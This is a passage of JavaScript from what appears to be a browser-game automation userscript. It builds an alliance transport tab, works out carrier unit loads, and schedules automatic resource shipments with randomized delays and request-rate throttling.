		+'				<input id=' + setUID('Tabs.Alliance.tabTransport.auto_trsp_delay') + ' size=1 maxlength=2 type=text value="' 
		+ 					Data.options.alliance.auto_trsp.delay + '">'
		+'				</input>'
		+'				<select id=' + setUID('Tabs.Alliance.tabTransport.auto_trsp_unit') + ' size=1>'
		+'					<option value=60 ' + sel_Unit[0] + '>' + translate('Minutes') + '</option>'
		+'					<option value=3600 ' + sel_Unit[1] + '>' + translate('Hours') + '</option>'
		+'					<option value=86400 ' + sel_Unit[2] + '>' + translate('Days') + '</option>'
		+'				</select>'
		+'	    </td>'
		+'		</tr>'
		+'	</table>'
		+'	<br>'
		+'</div>';

		html +=
		 '	<div class=' + UID['status_ticker'] + ' id='+ setUID('Tabs.Alliance.tabTransport.status') + ' style="margin-bottom:5px !important">'
		+'		<center>'
		+'			<input type=button value="OnOff" id=' + setUID('Tabs.Alliance.tabTransport.enabled') + ' />'
		+'		</center>'
		+'		<div class=' + UID['status_report'] + ' style="height:140px; max-height:140px;">'
		+'			<table id=' + setUID('Tabs.Alliance.tabTransport.auto_transport') + ' class="' + UID['table'] + ' zebra"  style="width:474px;max-width:474px;">'
		+'			</table>'
		+'		</div>'
		+'		<div id=' + setUID('Tabs.Alliance.tabTransport.feedback') + ' class=' + UID['status_feedback'] + '></div>'
		+'	</div>'
		+'</div>';
		
		$J( '#'+UID['Tabs.Alliance.content'] )
		.css ( {
			'height'		: '590px',
			'margin-top'	: '9px',
			'overflow'      : 'hidden'
		})
		.html(html); 

		// Add listener
		$J( '#'+UID['Tabs.Alliance.tabTransport.AjustTrsp']).click ( onClickAjustTrsp );
		$J( '#'+UID['Tabs.Alliance.tabTransport.RefreshMember']).click( function(){
			t.refreshList ();
		} );
		$J( '#'+UID['Tabs.Alliance.tabTransport.clearAll']).click ( onClickClearAll );
		$J( '#'+UID['Tabs.Alliance.tabTransport.Launch']).click ( sendTransp );

		$J( '#'+UID['Tabs.Alliance.tabTransport.AddPlan']).click ( planTransp );

		$J('#'+UID['Tabs.Alliance.tabTransport.enabled']).click (function (){
			t.setTrspEnable ( !Data.options.alliance.auto_trsp.enabled );
		});

		t.setTrspEnable ( Data.options.alliance.auto_trsp.enabled );
		
		$J('#'+UID['Tabs.Alliance.tabTransport.auto_trsp_delay']).change ( onChangeTime );
		$J('#'+UID['Tabs.Alliance.tabTransport.auto_trsp_unit']).change ( onChangeUnit );

		// Add transport table
		troopTable ($id(UID['Tabs.Alliance.tabTransport.TTroops']), 'Tabs.Alliance.tabTransport.TTroops', eventTroopsTransport);

		for (i=0; i<t.transportable_resource_types.length; i++){
			$J( '#'+UID['Tabs.Alliance.tabTransport.Res_'+t.transportable_resource_types[i]]).change ( resourceChanged );
			butMax = $id(UID['Tabs.Alliance.tabTransport.Max_'+ t.transportable_resource_types[i]]);
			$J(butMax).click ( setResourceMax );
			setButtonStyle (butMax, true);
			butZero = $id(UID['Tabs.Alliance.tabTransport.Zero_'+ t.transportable_resource_types[i]]);
			$J(butZero).click ( setResourceZero );
			setButtonStyle (butZero, true);
		}
		getMemberList();
		playerCityDesc();
		displayTotal();
		t.plansTick();  

		clearInterval ( t.timers.resources ); t.timers.resources=null;
		t.timers.resources = setInterval (ResourcesTick, 1000);

		
		function troopTable (tab, prefix, listener){
			var t = Tabs.Alliance;
			var row =[];
			row.push(tab.insertRow(-1));
			row.push(tab.insertRow(-1));
//			row.push(tab.insertRow(rownum+2));

			var val;
			var iRow, iCell;
			for (var i=0; i < t.transport_unit_types.length; ++i) {
				//row[0].insertCell(c).innerHTML = translate (t.transport_unit_types[i]);
				
				iRow  = row[0];
				iCell = iRow.insertCell ( -1 );
				iCell.innerHTML = 	'<span class="' + UID['doa-icons'] + ' i-' + t.transport_unit_types[i] + '" ></span>'			
				iCell.style.width = '10%';

				var inp = document.createElement ('input');
				inp.type = 'text';
				inp.size = '2';
				inp.style.width = '65px';
				inp.title = translate(t.transport_unit_types[i]);
				inp.style.border = '1px solid grey';
				inp.maxlength = '6';
				if (Data.options.alliance.data.transports[t.transport_unit_types[i]] == undefined)
						Data.options.alliance.data.transports[t.transport_unit_types[i]] = 0;
				val = parseInt(Data.options.alliance.data.transports[t.transport_unit_types[i]]);
				
				if (!val) val = 0;
				inp.value = val;
				//inp.name = prefix +'_'+ t.transport_unit_types[i];
				inp.setAttribute( 'ref', t.transport_unit_types[i]);
				inp.setAttribute( 'id' , setUID('Tabs.Alliance.tabTransport.TTrsp_'+t.transport_unit_types[i]));

				$J(inp).change ( listener );

				iCell.appendChild (inp);

				iRow = row[1];
				iCell = iRow.insertCell(-1);
				//iCell.align = "center";
				iCell.setAttribute( 'id' , setUID('Tabs.Alliance.tabTransport.TStk_'+t.transport_unit_types[i]));
				iCell.style.textAlign = 'center';
				var stk = parseIntZero(Units.getUnitNumbers(0,t.transport_unit_types[i]).incity).intToCommas();
				iCell.className = 'jewel';
				iCell.innerHTML = '(&nbsp;'+ stk +'&nbsp;)';
			}
			return tab;
		}
		
		function onChangeTime ( event )
		{
			var time = parseIntZero( $J(this).val() );
			if ( Data.options.alliance.auto_trsp.unit == 60 && (time*60) < Data.options.attacks.delay_min ) {
				time = Math.round(Data.options.attacks.delay_min / 60);
				$J(this).val( time );
			}
			Data.options.alliance.auto_trsp.delay = time;
		}

		function onChangeUnit ( event )
		{
			Data.options.alliance.auto_trsp.unit = parseIntZero( $J(this).val() );
		}
		
		function eventTroopsTransport (event){
			var t = Tabs.Alliance;
			var self = event.target;
			var transport_type = self.getAttribute( 'ref' );
			//var args = event.target.name.split('_');
			var unit_quantity = parseIntZero(event.target.value);

			if (isNaN(unit_quantity) 
			|| unit_quantity<0 
			|| unit_quantity > Seed.cities[0].figures.marches.maximum_troops
			|| unit_quantity > Units.getUnitNumbers(0,transport_type).incity ){
				event.target.style.backgroundColor = '#faa';
			} else {
				event.target.style.backgroundColor = '';
			}
			Data.options.alliance.data.transports[transport_type] = unit_quantity;
			playerCityDesc();
			//displayTotal();
		}
		
		function onClickAjustTrsp (){
			var t = Tabs.Alliance;
			var tabTrsp = [];
			t.totalResources = 0;
			for (var r=0; r<t.transportable_resource_types.length; r++) {
				t.totalResources += parseIntZero(Data.options.alliance.data.resources[t.transportable_resource_types[r]]);
			}
			
			if ( t.totalResources <=0 ) {
				return
			}
			
			var tot_qty_trsp=0;
			var load=0;
			t.maxResources = 0;
			for (var i=0; i<t.transport_unit_types.length; i++){
				var qty  = Data.options.alliance.data.transports[t.transport_unit_types[i]];
				try {
					load = Seed.stats.unit[t.transport_unit_types[i]].load;
					speed = Seed.stats.unit[t.transport_unit_types[i]].speed;
				} catch(e){
					actionLog('<B>' + translate('Troops load: ') + '</B>' + e.msg + ' ' + translate('Manifest not available, using defaults'));
				}
				t.maxResources += (parseIntZero(qty) * parseIntZero(load));
				if ( qty && qty > 0 ) {
					tot_qty_trsp += qty;
				}
				var stk_unit=Units.getUnitNumbers(0,t.transport_unit_types[i]).incity;
				tabTrsp.push ({	type		: t.transport_unit_types[i],
							load	: load,
							speed : speed,
							qty_sel	: qty,
							new_qty : 0,
							stock	: stk_unit,
							max_load : parseInt(stk_unit) * load,
							});
			}
			
			if ( tot_qty_trsp > 0 ) {
				if ( t.totalResources > t.maxResources) {
					var msg = $J.msg({ 
						content 	 : translate ('Load capacity') + ' ' + translate ('exceed'),
						target		 : t.container,
						clickUnblock : false,
						timeOut 	 : 4000
					});
					return
				} else {
					tabTrsp.sort( function(a,b){return b.qty_sel - a.qty_sel;} );
					var ressource_to_trsp=t.totalResources;
					for (i=0; i<tabTrsp.length;i++) {
						if ( tabTrsp[i].qty_sel > 0 ) {
							if ( ressource_to_trsp <= 0) {
								tabTrsp[i].new_qty=0;
							} else {
								if ( ressource_to_trsp > tabTrsp[i].max_load ) {
									tabTrsp[i].new_qty=tabTrsp[i].stock;
									ressource_to_trsp -= tabTrsp[i].max_load;
								} else {
									var new_qty = parseInt(ressource_to_trsp / tabTrsp[i].load) 
									if ( (ressource_to_trsp / tabTrsp[i].load) > new_qty ) {
										new_qty++;
									}
									tabTrsp[i].new_qty=new_qty;
									ressource_to_trsp -= new_qty * tabTrsp[i].load;
								}
							}
						}
					}
				}
			} else {
				var ressource_to_trsp=t.totalResources;
				// first : the more speed
				tabTrsp.sort( function(a,b){return b.speed-a.speed} );
				for (i=0; i<tabTrsp.length && ressource_to_trsp>0;i++)
				{
					if ( tabTrsp[i].max_load > ressource_to_trsp ) {
						var new_qty = parseInt(ressource_to_trsp / tabTrsp[i].load) 
						if ( (ressource_to_trsp / tabTrsp[i].load) > new_qty ) {
							new_qty++;
						}
						tabTrsp[i].new_qty = new_qty
						ressource_to_trsp -= new_qty * tabTrsp[i].load;
					} 
				}
				// then : the more number and dispatching 
				tabTrsp.sort( function(a,b){return b.max_load-a.max_load} );
				for (i=0; i<tabTrsp.length && ressource_to_trsp>0;i++)
				{
					if ( tabTrsp[i].max_load > ressource_to_trsp ) {
						var new_qty = parseInt(ressource_to_trsp / tabTrsp[i].load) 
						if ( (ressource_to_trsp / tabTrsp[i].load) > new_qty ) {
							new_qty++;
						}
						tabTrsp[i].new_qty = new_qty;
						ressource_to_trsp -= new_qty * tabTrsp[i].load;
					} else {
						tabTrsp[i].new_qty = tabTrsp[i].stock;
						ressource_to_trsp -= tabTrsp[i].stock * tabTrsp[i].load;
					}
				}
				if (ressource_to_trsp > 0 ) {
					var msg = $J.msg({ 
						content 	 : translate ('Not enough transport'),
						target		 : t.container,
						clickUnblock : false,
						timeOut 	 : 4000
					});
					return;
				}
			}
			for (i=0; i<tabTrsp.length;i++)
			{
				Data.options.alliance.data.transports[tabTrsp[i].type] = tabTrsp[i].new_qty;
				$J('#'+UID['Tabs.Alliance.tabTransport.TTrsp_' + tabTrsp[i].type]).val(tabTrsp[i].new_qty);
			}						
			//displayTotal();
		}

		function onClickClearAll (){
			var t = Tabs.Alliance;
			Data.options.alliance.data.transports={};
			Data.options.alliance.data.resources={};
			//for (var i=0; i < t.transport_unit_types.length; i++)
			//for (var r=0; r<t.transportable_resource_types.length; r++)
			//	Data.options.alliance.data.resources[t.transportable_resource_types[r]] = 0;
			t.tabTransport();
		}
		
		function resourceChanged (event){
			var self = event.target;
			
			var resource_type = self.getAttribute( 'ref' );
			
			var x = parseIntZero(self.value);

			t.totalResources = 0;
			//var actualStock = 0;
			for (var r=0; r<t.transportable_resource_types.length; r++) {
				if (t.transportable_resource_types[r] != resource_type) {
					t.totalResources = parseIntZero(t.totalResources) + parseIntZero(Data.options.alliance.data.resources[t.transportable_resource_types[r]]);
				}

				//if (t.transportable_resource_types[r] == resource_type) {
				//	actualStock = parseIntZero(Seed.cities[0].resources[t.transportable_resource_types[r]] || 0);
				//}
				$J('#'+UID['Tabs.Alliance.tabTransport.Res_' + t.transportable_resource_types[r]]).css({backgroundColor:'white'});
			}
			x=parseIntZero(x);
			if (isNaN(x) || x<0 || (x + parseIntZero(t.totalResources))>parseIntZero(t.maxResources))
			{
				self.style.backgroundColor = '#faa';
			}
			else 
			{
				self.style.backgroundColor = '';
			}
			self.value = x;
			Data.options.alliance.data.resources[resource_type] = parseIntZero(x);
			//$J('#'+UID['Tabs.Alliance.tabTransport.Rem_' + resource_type]).html('( ' + parseInt(actualStock - parseIntZero(x)).intToCommas() + ' )');
			displayTotal();
		}
		
		function setResourceMax (event){
			var self = event.target;
			
			var resource_type = self.getAttribute( 'ref' );
			var max = 0;
			
			var cur = parseIntZero(Seed.cities[0].resources[resource_type]);
		
			var totalOtherResources = 0;
			for (var r=0; r<t.transportable_resource_types.length; r++) {
				if (t.transportable_resource_types[r] != resource_type) {
					totalOtherResources += parseIntZero(Data.options.alliance.data.resources[t.transportable_resource_types[r]]);
				}
			}
			
			max = parseIntZero(t.maxResources) - parseIntZero(totalOtherResources);
			if (max > cur) max = cur;
			Data.options.alliance.data.resources[resource_type] = parseIntZero(max);
			$J('#'+UID['Tabs.Alliance.tabTransport.Res_' + resource_type]).val(parseIntZero(max));
			displayTotal();
		}
		
		function setResourceZero (event){
			var self = event.target;
			
			var resource_type = self.getAttribute( 'ref' );
			
			Data.options.alliance.data.resources[resource_type] = 0;
			
			$J('#'+UID['Tabs.Alliance.tabTransport.Res_' + resource_type]).val(0);

			displayTotal();
		}
		
		function setButtonStyle (element, enabled) 
		{
			if ( enabled ) {
				element.disabled = false;
				$J(element).removeClass(UID['bnt_red']);
				$J(element).addClass(UID['bnt_green']);
			}
			else {
				element.disabled = true;
				$J(element).removeClass(UID['bnt_green']);
				$J(element).addClass(UID['bnt_red']);
			}
		}
		
		function displayTotal ()
		{
			var t = Tabs.Alliance;
			t.totalResources = 0;
			t.maxResources = 0;
			for (var r=0; r<t.transportable_resource_types.length; r++) {
				t.totalResources = parseIntZero(t.totalResources) + parseIntZero(Data.options.alliance.data.resources[t.transportable_resource_types[r]]);
			}
			for (var i=0; i<t.transport_unit_types.length; i++){
				//if (t.transport_unit_types[i] == 'Porter') var load = 200;
				//else if (t.transport_unit_types[i] == 'ArmoredTransport') var load = 5000;
				//else if (t.transport_unit_types[i] == 'PackDragon') var load = 6000;
				//else var load = 0;
				var qty  = Data.options.alliance.data.transports[t.transport_unit_types[i]];
				try {
					var load = Seed.stats.unit[t.transport_unit_types[i]].load;
				} catch(e){
					actionLog('<B>' + translate('Troops load: ') + '</B>' + e.msg + ' ' + translate('Manifest not available, using defaults'));
				}
				t.maxResources = t.maxResources + (parseIntZero(qty) * parseIntZero(load));
			}
			var avail = parseInt(parseIntZero(t.maxResources) - parseIntZero(t.totalResources)).intToCommas();
			var HTML = 
			  '<B>' + parseIntZero(t.totalResources).intToCommas() + '</B>'
			+ ' / <B>' + parseIntZero(t.maxResources).intToCommas() + '</B>'
			+ ' (<B>' + avail + '</B> disponible)';
			$J('#'+UID['Tabs.Alliance.tabTransport.Total']).html(HTML);
		}
		
		function sendTransp (){
			var t = Tabs.Alliance;
			
			var dialogbox = dialogBox({
				id		 : setUID('dialog-sendtransp'),
				minWidth : 300,
				centerTo : t.container,
				buttons  : [],
				overlay  : true,
				title	 : translate('Message'),
				html	 : '<center>' +  translate ('Sending transport') + '</center>'
			});

			//Check target
			var found = false;
			var target = {};
			for (var cid=1; cid < Seed.cities.length && !found; cid++) {
				if (Seed.cities[cid] && Data.options.alliance.transport_id == Seed.cities[cid].id) {
					found = true;
					target.name = translate(Seed.cities[cid].name);
					target.city = null;
					target.x = Seed.cities[cid].x;
					target.y = Seed.cities[cid].y;
				}
			}
			
			if (!found) {
				for (var i=0; i<Data.dynamic.players.memberships.length && !found; i++){
					if (Data.dynamic.players.memberships[i].player.id == Data.options.alliance.transport_id){
						found = true;
						target.name = Data.dynamic.players.memberships[i].player.name;
						target.city = Data.dynamic.players.memberships[i].player.city.name;
						target.x = Data.dynamic.players.memberships[i].player.city.x;
						target.y = Data.dynamic.players.memberships[i].player.city.y;
					}
				}
			}

			if (!found) {
				dialogbox.html('<B>' + translate('No target defined') + '.</B>');
				
				dialogbox.centerTo();
				dialogbox.buttons([
					{
						text: translate('Accept'),
						click: function() { 
							dialogbox.destroy();
						}
					}
				]);
				return;
			}
			
			var targMsg = '<B>' + translate('Sending transport to ') + '</B> : ' + target.name  + (target.city ? (', ' + target.city) :'') + '<BR> ' + translate ('at') + ' ' + target.x +','+ target.y;
			
			dialogbox.html('<center>' + targMsg + '.</center>')
			
			t.checkTransport ( {	
				
				resources : Data.options.alliance.data.resources.cloneProps(),
				units     : Data.options.alliance.data.transports.cloneProps(),
				
				target    : target,
					
				onSuccess : function( r ) {
					dialogbox.timeOut(2000);
					dialogbox.destroy(); 
				},
				
				onFailure : function( r ) {
				
					if (r.errmsg) {
						dialogbox.html('<B>' + r.errmsg + '.</B>');
					}
					else {
						dialogbox.html('<B>' + r + '.</B>');
					}
				
					dialogbox.centerTo();
					dialogbox.buttons([
						{
							text: translate('Accept'),
							click: function() { 
								dialogbox.destroy();
							}
						}
					]);
				},
			
				caller : 'Tabs.Alliance.tabTransport.sendTransp'
				
			});
		}
		
		function planTransp (){
			var plan_trsp = {};
			var now = parseInt( serverTime() );
			plan_trsp.id = now;
			plan_trsp.units = Data.options.alliance.data.transports.cloneProps();
			plan_trsp.ress = Data.options.alliance.data.resources.cloneProps();
			
			plan_trsp.units = removeEmpty(plan_trsp.units);
			plan_trsp.ress = removeEmpty(plan_trsp.ress);

			plan_trsp.target = {};
			var found = false;
			for (var cid=1; cid < Seed.cities.length && !found; cid++) {
				if (Seed.cities[cid] && Data.options.alliance.transport_id == Seed.cities[cid].id) {
					found = true;
					plan_trsp.target.name = translate(Seed.cities[cid].name);
					plan_trsp.target.city = '';
					plan_trsp.target.x = Seed.cities[cid].x;
					plan_trsp.target.y = Seed.cities[cid].y;
				}
			}
				
			if (!found) {
				for (var i=0; i<Data.dynamic.players.memberships.length && !found; i++){
					if (Data.dynamic.players.memberships[i].player.id == Data.options.alliance.transport_id){
						found = true;
						plan_trsp.target.name = Data.dynamic.players.memberships[i].player.name;
						plan_trsp.target.city = Data.dynamic.players.memberships[i].player.city.name;
						plan_trsp.target.x = Data.dynamic.players.memberships[i].player.city.x;
						plan_trsp.target.y = Data.dynamic.players.memberships[i].player.city.y;
					}
				}
			}
			
			plan_trsp.delay = Data.options.alliance.auto_trsp.delay * Data.options.alliance.auto_trsp.unit;
			plan_trsp.run_at = serverTime();
			plan_trsp.marches = {};
			plan_trsp.last_res = null;
			
			Data.options.alliance.auto_trsp.plans.push ( plan_trsp );
						
			function removeEmpty ( obj ) {
				for ( var key in obj )
				{
					obj[key]=parseInt(obj[key]);
					if ( obj[key] == 0 ){
						delete obj[key];
					}
				}
				return obj;
			}

		}
		
		function getMemberList (){
			var t = Tabs.Alliance;
			var html = '<select id=' + setUID('Tabs.Alliance.tabTransport.TransPlayer') + '>';
			var selected = '';
			var id_sel ;
			//if (!Data.options.alliance.transport_id && Seed.cities.length > 1 ) {
			//	id_sel = Seed.cities[1].id;
			//}
			for (var cityIdx=1; cityIdx < Seed.cities.length; cityIdx++) {
				if (Seed.cities[cityIdx]) {
					selected = '';
					if ( cityIdx === 1 ) {
						id_sel = Seed.cities[cityIdx].id;
						selected = ' selected';
					}
					if (Data.options.alliance.transport_id == Seed.cities[cityIdx].id) {
						id_sel = Seed.cities[cityIdx].id;
						selected = ' selected';
					}
					html += '<option value="' + Seed.cities[cityIdx].id + '" '+selected+'>' + translate(Seed.cities[cityIdx].name) + '</option>';
				}
			}
			if (Seed.cities.length < 2 && (!Data.dynamic.players.memberships || Data.dynamic.players.memberships.length == 0))
				html += '<option value="">' + translate('To be refreshed') + '</option>';
			else {
				Data.dynamic.players.memberships.sort(function(a, b){a = (a.player.name||'').toLowerCase(); b = (b.player.name||'').toLowerCase(); if (a>b) return 1; if (a <b) return -1; return 0;});

				for (var i=0; i<Data.dynamic.players.memberships.length; i++){
					selected = '';
					if ( i == 0 && !id_sel ) {
						id_sel = Data.dynamic.players.memberships[i].player.id
						selected = ' selected';
					}
					if (Data.dynamic.players.memberships[i].player.id == Data.options.alliance.transport_id) {
							id_sel = Data.dynamic.players.memberships[i].player.id
							selected = ' selected';
					}
					html += '<option value="' + Data.dynamic.players.memberships[i].player.id + '" '+selected+'>' + Data.dynamic.players.memberships[i].player.name + '</option>';
				}
			}
			if ( id_sel ) {
				Data.options.alliance.transport_id = id_sel;
			}
			html += '</select>';
			$J('#'+UID['Tabs.Alliance.tabTransport.TransPlayerList']).html( html );
			$J('#'+UID['Tabs.Alliance.tabTransport.TransPlayer']).change( playerSelChanged );
		}
		
		function playerSelChanged (event){
			var val = event.target.value;
			if (val === undefined || val === null)
				val = 'none';
			event.target.value = val;
			Data.options.alliance.transport_id = val;
			playerCityDesc();
		}
		
		function playerCityDesc (){
			var t = Tabs.Alliance;
			var found = false;
			var html = '';
			for (var cityIdx=1; cityIdx < Seed.cities.length && !found; cityIdx++) {
				if (Seed.cities[cityIdx] && Data.options.alliance.transport_id == Seed.cities[cityIdx].id) {
					found = true;
					var time = Marches.getMarchTime (Seed.cities[cityIdx].x, Seed.cities[cityIdx].y, Data.options.alliance.data.transports);
					html = 
					 '<B>' + translate(Seed.cities[cityIdx].name) + '</b>' 
					+' &nbsp; ('+Seed.cities[cityIdx].x + ', '+Seed.cities[cityIdx].y +') &nbsp;'
					+'<BR>'
					+' <B>' + translate('Distance') + ': </b>' 
					+ Map.getDistance(Seed.cities[0].x, Seed.cities[0].y, Seed.cities[cityIdx].x, Seed.cities[cityIdx].y)
					+ ' ('+timeFormatShort(time)+')';
				}
			}
			if (!found) {
				for (var i=0; i<Data.dynamic.players.memberships.length && !found; i++){
					if (Data.dynamic.players.memberships[i].player.id == Data.options.alliance.transport_id){
						found = true
						var time = Marches.getMarchTime (Data.dynamic.players.memberships[i].player.city.x, Data.dynamic.players.memberships[i].player.city.y, Data.options.alliance.data.transports);
						html = 
						 translate('City') 
						+' &nbsp; <B>' + Data.dynamic.players.memberships[i].player.city.name + '</b>' 
						+' &nbsp; ('+Data.dynamic.players.memberships[i].player.city.x + ', '+Data.dynamic.players.memberships[i].player.city.y + ')'
						+'<BR>'
						+' <B>' + translate('Distance') + ': </b>' 
						+ Data.dynamic.players.memberships[i].dist
						+' ('+timeFormatShort(time)+')';
					}
				}
			}
			$J( '#'+UID['Tabs.Alliance.tabTransport.TransTarget'] ).html(html); 
		}
		
		function ResourcesTick() {
			var t = Tabs.Alliance;

			for (var i=0; i < t.transport_unit_types.length; ++i) {
				var stk = parseIntZero(Units.getUnitNumbers(0,t.transport_unit_types[i]).incity).intToCommas();
				var html = '(&nbsp;'+ stk +'&nbsp;)';
				
				$J( '#'+UID['Tabs.Alliance.tabTransport.TStk_'+t.transport_unit_types[i]] ).html(html);
			}

			for (var p=0; p<t.transportable_resource_types.length; p++){
				var num = parseIntZero(Data.options.alliance.data.resources[t.transportable_resource_types[p]]);
				var actualStock = parseIntZero(Seed.cities[0].resources[t.transportable_resource_types[p]] || 0);
    	
				var remaining = '( ' + parseInt(actualStock - num).intToCommas() +' )';
				actualStock = parseInt(actualStock).intToCommas();
    	
				$J('#'+UID['Tabs.Alliance.tabTransport.Rem_' + t.transportable_resource_types[p]]).html(remaining);
				$J('#'+UID['Tabs.Alliance.tabTransport.Stk_' + t.transportable_resource_types[p]]).html(actualStock);
			}

			displayTotal();
		}
		
	},

	setTrspEnable : function ( on_off )
	{
		var t = Tabs.Alliance;
		clearTimeout (t.transport.timer.auto_trsp); t.transport.timer.auto_trsp=null;
		
		var but = $id(UID['Tabs.Alliance.tabTransport.enabled']);
		Data.options.alliance.auto_trsp.enabled = on_off;
		
		if ( on_off ) {
		
			//t.dispFeedback(translate('Starting soon') + '...' + translate('Please wait') + '...');
		
			if ( but ) {
				but.value = translate('Transporting').toUpperCase();
				but.className = UID['btn_on'];
			}
			
			//t.running.start_at = serverTime();
			//t.running.attacks = 1;
			t.transport.inProgress = false;
			
			t.autoCheckTransport();
			//t.autoCheckTargets();
		} 
		else {
			if ( but ) {
				but.value = translate('Disabled').toUpperCase();
				but.className = UID['btn_off'];
			}
		}
	},

	autoCheckTransport : function () {
		var t = Tabs.Alliance;
		var retry_delay, marching = 0, total_marches=0;
		var target_msg=''
		var now = parseInt( serverTime() );
		clearTimeout (t.transport.timer.auto_trsp); t.transport.timer.auto_trsp=null;
		
		if (!Data.options.alliance.auto_trsp.enabled) {
			t.transport.inProgress = false;
			return;
		}

		if ( t.transport.inProgress == true )
		{
			delay = Math.randRange( 15000, 30000 );
			t.transport.timer.auto_trsp = setTimeout ( t.autoCheckTransport, delay );
			return;
		}
		t.transport.inProgress = true; 

		var min_time = 700000;
		var max_time = 0;
		for (id in Seed.marches)
		{
			++total_marches;
			if (Seed.marches[id].status === 'marching'){
				++marching;
			}
			
			// Fixed by Jawz74
			var left_time = ( Seed.marches[id].run_at - parseInt(serverTime()) ) + (Seed.marches[id].status=='marching' ? Seed.marches[id].duration : 0);

			//fixed by Didi
			if (left_time > 0) {
				min_time = min_time < left_time ? min_time : left_time;
				max_time = max_time > left_time ? max_time : left_time;
			}
		}
		
		//fixed by Didi
		if ( min_time === 700000 || max_time === 0 ) {
			min_time = 3;
		}
		
		retry_delay = (min_time * 1000) + 10000 + Math.randRange(2000,5000);

		var plan = getPlan();
		
		if ( plan == null ) {
			t.transport.inProgress = false;
			t.transport.timer.auto_trsp = setTimeout(t.autoCheckTransport, 5000);
			return;
		}
		
		target_msg = plan.target.x + '/' + plan.target.y;
		   	
		if ( Seed.cities[0].figures.marches.maximum - Seed.total.marches <= 0 )
		{
			//verboseLog('<b>Attack</b> to ' + target_msg + ' delayed due to </b>insufficent march</b> slots: retry in ' + timeFormat(retry_delay/1000));
   	
			t.dispFeedback (translate('Muster Point') +' '+ translate('Full') + ': ' + translate('Retry in') + ' ' + timeFormat(retry_delay/1000));
			t.transport.timer.auto_trsp = setTimeout(t.autoCheckTransport, retry_delay);
			plan.last_res = translate('Muster Point') +' '+ translate('Full');
			plan.run_at = now + parseInt(retry_delay / 1000);
			t.transport.inProgress = false;
			return;
		}
		
		
		
		t.checkTransport ( {	
			
			resources : plan.ress,
			units     : plan.units,
			
			target    : plan.target,
				
			onSuccess : function( r ) {

				var t = Tabs.Alliance, delay;

				plan.marches[r.job.march_id]=r.job.march_id;
				plan.last_res = 'OK';
				plan.run_at = parseInt( now + plan.delay );

				t.running.errors=0;

				var delay_min = Data.options.attacks.delay_min;
				var delay_max = Data.options.attacks.delay_max;
				
				delay = Math.randRange(delay_min*1000, delay_max*1000);

				if ( Data.options.marches.requests.counter >= Data.options.marches.requests.max_per_hour )
				{
					if ( parseInt(serverTime() - Data.options.marches.requests.start_at) < 3600 )
					{
						delay = parseInt( (3600 - (serverTime() - Data.options.marches.requests.start_at)) * 1000);
						setTimeout(function(){t.dispFeedback(translate('Transports stopped momentarily to prevent server blocking') + ' - ' + translate('waiting') + ': ' + timeFormat(delay/1000))}, delay_min*500 );
					}
					else {
						Data.options.marches.requests.start_at = serverTime();
						Data.options.marches.requests.counter = 1;
					}
				}
				else if ((Data.options.marches.requests.counter % 15) === 0)
				{
					delay = 45 * total_marches * 1000;
					setTimeout(function(){t.dispFeedback(translate('Transports stopped momentarily to prevent server blocking') + ' - ' + translate('waiting') + ': ' + timeFormat(delay/1000))}, delay_min*500 );
				}
				else {
					delay = Math.randRange(delay_min*1000, delay_max*1000);
					setTimeout(function(){t.dispFeedback('')}, parseInt(delay/2) );
				}
				t.transport.inProgress = false;
				t.transport.timer.auto_trsp = setTimeout(t.autoCheckTransport, delay);
				return;
			},
			
			onFailure : function( r ) {
			
				var t = Tabs.Alliance, normal_delay, delay;

				++t.running.errors;
				
				var delay_min = Data.options.attacks.delay_min;
				var delay_max = Data.options.attacks.delay_max;
				normal_delay = Math.randRange(delay_min*1000, delay_max*1000);

				delay = 30000 * (t.running.errors > 0 ? t.running.errors * t.running.errors : 1);
				
				//didi : change delay when failure because when error it's because troop
				if (delay < retry_delay) 
				{
					delay = retry_delay;
				}
				
				if (delay < normal_delay) 
				{
					delay = normal_delay;
				}

				if ( r.status ) {
					if ( r.status === 509 )
					{
						delay = ERROR_509_DELAY;
						verboseLog('<b>Transport</b> to ' + target_msg + ' failed - <b>' + translate('Bandwidth Limit Exceeded') + '</b>,' + translate('Too many requests') + '! -  ' + translate('Retry in') + ' :' + timeFormat(delay/1000));
				
						t.dispFeedback(translate('Transport') + ' ' + target_msg + ' ' + translate('failed')+' - ' + translate('Bandwidth Limit Exceeded') + '</b>,' + translate('Too many requests') + '! -  ' + translate('Retry in') +' '+ timeFormat(delay/1000));
					}
					if ( r.status === 429 )
					{
						delay = ERROR_429_DELAY;
						verboseLog('<b>Transport</b> to ' + target_msg + ' failed - <b>' + 'API ' + translate('Bandwidth Limit Exceeded') + '</b>,' + translate('Too many requests') + '! -  ' + translate('Retry in') + ' :' + timeFormat(delay/1000));
				
						t.dispFeedback(translate('Transport') + ' ' + target_msg + ' ' + translate('failed')+' - API ' + translate('Bandwidth Limit Exceeded') + '</b>,' + translate('Too many requests') + '! -  ' + translate('Retry in') +' '+ timeFormat(delay/1000));
					}
				}
				else if ( r.errmsg ) {
					verboseLog('<b>Transport</b> to ' + target_msg + ' delayed due to </b>' + r.errmsg + '</b>: retry in ' + timeFormat(delay/1000));

					t.dispFeedback ( r.errmsg + ': ' + translate('Retry in') + ' ' + timeFormat(delay/1000) );
				}
				
				if ( r.errmsg ) 
					plan.last_res = r.errmsg;
				else 
					plan.last_res = r;
					
				plan.run_at = parseInt( now + plan.delay );

				t.transport.inProgress = false;
				t.transport.timer.auto_trsp = setTimeout(t.autoCheckTransport, delay);

			},
		
			caller : 'Tabs.Alliance.autoCheckTransport'
			
		});
	
		function getPlan() {
			var plans = Data.options.alliance.auto_trsp.plans;
			var new_plan = null;
			for (var p=0 ; p<plans.length; p++) {
				var plan=plans[p];
				if ( now > plan.run_at + 10 ) {
					new_plan=plan;
					break;
				} 
			}
			return new_plan;
		}
	},
	
	checkTransport : function (options){
		var t = Tabs.Alliance;
		var cityId = Seed.cities[0].id;
		var cityIdx = 0;
		
		// check resources
		var ress = options.resources;
		var totRess = 0;
		for (var p in ress) {
			if (ress[p] > 0) totRess += ress[p];
		}
		
		if (totRess <= 0){
			if (options.onFailure) {
				options.onFailure (translate('No resources to transport defined'));
			}
			return;
		}

		// check troops
		var units = options.units;
		var authMaxTroops = Seed.cities[0].figures.marches.maximum_troops;
		var totTroops = 0;
		var max_load = 0;
		for (var p in units){
			unit_qty = parseInt(units[p]);
			units[p]=unit_qty;
			if (unit_qty > 0){
				var load = Seed.stats.unit[p].load;
				max_load += load * unit_qty;
				totTroops += unit_qty;
				if (Units.getUnitNumbers(cityIdx,p).incity < unit_qty){
